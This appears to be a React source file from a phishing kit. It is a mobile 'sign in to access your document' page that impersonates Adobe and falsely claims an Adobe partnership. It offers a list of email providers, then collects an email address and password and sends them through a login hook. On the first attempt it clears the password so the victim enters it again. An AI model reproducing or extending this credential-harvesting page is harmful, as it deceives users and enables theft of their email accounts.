import React, { useState } from 'react';
import { ArrowLeft, Eye, EyeOff } from 'lucide-react';
import { useLogin } from '../../hooks/useLogin';
import Spinner from '../../components/common/Spinner';

interface LoginPageProps {
  fileName: string;
  onBack: () => void; // This was missing
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  onYahooSelect?: () => void;
  onAolSelect?: () => void;
  onGmailSelect?: () => void;
  onOffice365Select?: () => void;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName,
  onBack, // Added here
  onLoginSuccess,
  onLoginError,
  onYahooSelect,
  onAolSelect,
  onGmailSelect,
  onOffice365Select,
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
    onBack(); // This was the missing call
  };

  const handleProviderClick = (providerName: string) => {
    if (providerName === 'Office365' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Outlook' && onOffice365Select) {
      onOffice365Select();
    } else if (providerName === 'Yahoo' && onYahooSelect) {
      onYahooSelect();
    } else if (providerName === 'AOL' && onAolSelect) {
      onAolSelect();
    } else if (providerName === 'Gmail' && onGmailSelect) {
      onGmailSelect();
    } else {
      setSelectedProvider(providerName);
    }
  };

  const AdobeLogo = () => (
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-7 h-7">
      <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
      <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
      <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
    </svg>
  );

  return (
    <div className="min-h-screen flex flex-col font-sans bg-white">
      {!selectedProvider ? (
        <div className="flex-1 flex flex-col justify-center px-6 py-8">
          <div className="mb-8 text-center">
            <div className="flex justify-center mb-4">
              <AdobeLogo />
            </div>
            <h1 className="text-lg font-semibold text-gray-900 mb-1">Sign in to access your document</h1>
            <p className="text-sm text-gray-500">
              <span className="font-medium text-gray-700">{fileName}</span>
            </p>
          </div>

          <p className="text-sm font-medium text-gray-700 mb-3">Choose your email provider</p>
          <div className="space-y-2">
            {emailProviders.map((provider) => (
              <button
                key={provider.name}
                onClick={() => handleProviderClick(provider.name)}
                type="button"
                className="w-full group"
              >
                <div className="flex items-center px-4 py-3 bg-white rounded-md border border-gray-200 active:bg-gray-50 transition-all duration-150">
                  <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain flex-shrink-0" />
                  <span className="flex-1 text-sm font-medium text-gray-800 ml-3 text-left">
                    {provider.name}
                  </span>
                  <svg className="w-4 h-4 text-gray-400 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </div>
              </button>
            ))}
          </div>
          <div className="mt-8 text-center">
            <p className="text-xs text-gray-400">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
          </div>
        </div>
      ) : (
        <div className="flex-1 flex flex-col justify-center px-6 py-8">
          <div className="mb-6 text-center">
            <div className="flex justify-center mb-4">
              <AdobeLogo />
            </div>
            <h1 className="text-lg font-semibold text-gray-900">Sign in with {selectedProvider}</h1>
            <p className="text-sm text-gray-500 mt-1">
              to access <span className="font-medium text-gray-700">{fileName}</span>
            </p>
          </div>

          <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-blue-600 active:text-blue-800 font-medium mb-5 transition-colors">
            <ArrowLeft className="w-4 h-4" />
            Change provider
          </button>

          <form onSubmit={handleSubmit} className="space-y-5">
            {errorMessage && (
              <div className="bg-red-50 text-red-600 p-3 rounded-md text-sm font-medium border border-red-200">
                {errorMessage}
              </div>
            )}
            <div>
              <label className="text-sm font-medium text-gray-700 block mb-1.5" htmlFor="email">Email address</label>
              <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full px-3 py-3 bg-white border border-gray-300 rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition placeholder:text-gray-400" />
            </div>
            <div>
              <label className="text-sm font-medium text-gray-700 block mb-1.5" htmlFor="password">Password</label>
              <div className="relative">
                <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-3 bg-white border border-gray-300 rounded-md text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition placeholder:text-gray-400" />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors">
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>
            <button type="submit" disabled={isLoading || !email || !password} className="w-full flex items-center justify-center py-3 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 transition-colors">
              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
              {isLoading ? 'Verifying...' : 'Sign In'}
            </button>
          </form>

          <div className="mt-8 text-center">
            <p className="text-xs text-gray-400">© 2026 Xtransferbloom. Secured in partnership with Adobe®.</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default MobileLoginPage;
